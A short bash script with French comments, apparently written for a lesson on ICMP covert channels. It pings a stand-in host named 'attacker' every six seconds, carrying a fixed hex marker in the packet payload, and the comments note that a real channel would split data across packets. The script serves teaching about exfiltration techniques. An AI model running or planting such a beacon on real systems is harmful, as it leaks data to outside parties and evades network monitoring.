#!/bin/bash
# L'option -p de ping accepte jusqu'à 16 octets de motif en hexadécimal,
# répétés pour remplir le paquet. "4341434531333337" = ASCII "CACE1337".
# C'est une vraie limite technique de ping (16 octets max) : mentionne-le
# explicitement dans la leçon plutôt que de le passer sous silence — un
# canal caché réel doit souvent composer avec ce genre de contrainte, en
# fragmentant les données sur plusieurs paquets.
while true; do
  ping -c 1 -p 4341434531333337 -s 64 attacker >/dev/null 2>&1
  sleep 6
done
